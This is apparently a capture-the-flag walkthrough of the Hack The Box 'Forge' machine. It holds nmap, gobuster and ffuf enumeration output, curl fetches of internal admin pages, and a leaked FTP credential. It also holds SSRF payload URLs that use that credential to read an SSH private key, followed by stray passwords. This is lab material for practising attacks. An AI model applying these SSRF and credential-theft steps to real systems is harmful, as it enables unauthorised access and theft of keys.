# NMAP

```
nmap -sC -sV -oA nmap/initial 10.10.11.111
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-15 13:15 EET
Nmap scan report for 10.10.11.111
Host is up (0.049s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
80/tcp open     http    Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://forge.htb
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.77 seconds

nmap -p- --min-rate=1000 -T4 10.10.11.111
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-15 13:16 EET
Nmap scan report for 10.10.11.111
Host is up (0.049s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE    SERVICE
21/tcp filtered ftp
22/tcp open     ssh
80/tcp open     http
```

# gobuster
```
/uploads              (Status: 301) [Size: 224] [--> http://forge.htb/uploads/]
/upload               (Status: 200) [Size: 929]                               
/static               (Status: 301) [Size: 307] [--> http://forge.htb/static/] 
/server-status        (Status: 403) [Size: 274]
```


# ffuf

```
ffuf -w /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt -u http://forge.htb -H "Host: FUZZ.forge.htb" -t 200 -fl 10

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://forge.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt
 :: Header           : Host: FUZZ.forge.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response lines: 10
________________________________________________

admin                   [Status: 200, Size: 27, Words: 4, Lines: 2]

```

#

```
sudo curl http://forge.htb/uploads/uJ4sTLH8aBFtrUZJz85y
<!DOCTYPE html>
<html>
<head>
    <title>Admin Portal</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br><br>
    <br><br><br><br>
    <center><h1>Welcome Admins!</h1></center>
</body>
</html>



┌──(phoenix㉿5UN)-[~/Desktop/HTB/Forge]
└─$ curl http://forge.htb/uploads/pv00nmR8O4IAZAKDsNHb
<!DOCTYPE html>
<html>
<head>
    <title>Announcements</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <link rel="stylesheet" type="text/css" href="/static/css/announcements.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br>
    <ul>
        <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
    </ul>
</body>
</html>
```

user:heightofsecurity123!

http://ADMIN.FORGE.HTB/?u=ftp://user:heightofsecurity123!@FORGE.HTB
http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@FORGE.HTB/.ssh/id_rsa


secretadminpassword
ihavefollowedharshitdoodia'smediumpage

